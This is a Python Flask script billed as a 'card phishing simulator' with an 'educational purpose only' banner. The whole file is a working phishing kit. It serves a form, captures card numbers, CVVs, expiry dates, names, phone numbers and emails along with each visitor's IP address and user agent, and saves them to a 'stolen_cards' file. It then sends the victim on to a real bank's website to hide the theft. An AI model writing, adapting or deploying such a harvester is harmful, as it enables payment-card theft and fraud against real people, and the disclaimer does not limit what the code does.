#!/usr/bin/env python3
from flask import Flask, request, render_template, redirect, url_for, jsonify
import json
import os
import datetime
from colorama import Fore, Style, init

init(autoreset=True)
app = Flask(__name__)
DATA_FILE = "data/stolen_cards.json"
os.makedirs("data", exist_ok=True)

def show_banner():
    print(f"{Fore.MAGENTA}{Style.BRIGHT}")
    print("  ██████╗ █████╗ ██████╗ ██████╗     ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗███╗   ██╗ ██████╗ ")
    print("  ██╔══██╗██╔══██╗██╔══██╗██╔══██╗    ██╔══██╗██║  ██║██║██╔════╝██║  ██║██║████╗  ██║██╔════╝ ")
    print("  ██████╔╝███████║██████╔╝██████╔╝    ██████╔╝███████║██║███████╗███████║██║██╔██╗ ██║██║  ███╗")
    print("  ██╔═══╝ ██╔══██║██╔══██╗██╔══██╗    ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║██║╚██╗██║██║   ██║")
    print("  ██║     ██║  ██║██║  ██║██║  ██║    ██║     ██║  ██║██║███████║██║  ██║██║██║ ╚████║╚██████╔╝")
    print("  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ")
    print(f"{Fore.CYAN}{Style.BRIGHT}")
    print("╔══════════════════════════════════════════════════════════════════════╗")
    print("║         💳  CARD PHISHING SIMULATOR  (ULTIMATE PREMIUM)            ║")
    print("║   🔥  EDUCATIONAL PURPOSE ONLY  |  🎯  Made by @the_babarrrr        ║")
    print("║   📡  Server: http://localhost:5000  |  🔒  For Security Awareness ║")
    print("╚══════════════════════════════════════════════════════════════════════╝")
    print(f"{Style.RESET_ALL}")
    print(f"{Fore.RED}⚠️ DISCLAIMER: Educational use only! Do NOT use on real victims.{Style.RESET_ALL}\n")

def save_card_details(data):
    entry = {
        "timestamp": datetime.datetime.now().isoformat(),
        "ip": request.remote_addr,
        "user_agent": request.headers.get("User-Agent"),
        "card_number": data.get("card_number"),
        "cvv": data.get("cvv"),
        "expiry_date": data.get("expiry_date"),
        "name": data.get("name"),
        "phone": data.get("phone"),
        "email": data.get("email")
    }
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            existing = json.load(f)
    else:
        existing = []
    existing.append(entry)
    with open(DATA_FILE, 'w') as f:
        json.dump(existing, f, indent=2)
    print(f"\n{Fore.GREEN}{Style.BRIGHT}💳 CARD CAPTURED!{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}🕒 Time: {entry['timestamp']}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}🌐 IP: {entry['ip']}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}💳 Card: {entry['card_number']}{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}🔐 CVV: {entry['cvv']}{Style.RESET_ALL}")
    print(f"{Fore.BLUE}📅 Expiry: {entry['expiry_date']}{Style.RESET_ALL}")
    print(f"{Fore.WHITE}👤 Name: {entry['name']}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}📱 Phone: {entry['phone']}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}📧 Email: {entry['email']}{Style.RESET_ALL}")
    print(f"{Fore.RED}{'='*60}{Style.RESET_ALL}")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    data = {
        "card_number": request.form.get('card_number'),
        "cvv": request.form.get('cvv'),
        "expiry_date": request.form.get('expiry_date'),
        "name": request.form.get('name'),
        "phone": request.form.get('phone'),
        "email": request.form.get('email')
    }
    save_card_details(data)
    return redirect('https://www.sbi.co.in')

@app.route('/api/stats')
def stats():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            data = json.load(f)
        return jsonify({
            "total": len(data),
            "latest": data[-1] if data else None
        })
    return jsonify({"total": 0, "latest": None})

if __name__ == '__main__':
    show_banner()
    app.run(host='0.0.0.0', port=5000, debug=False)
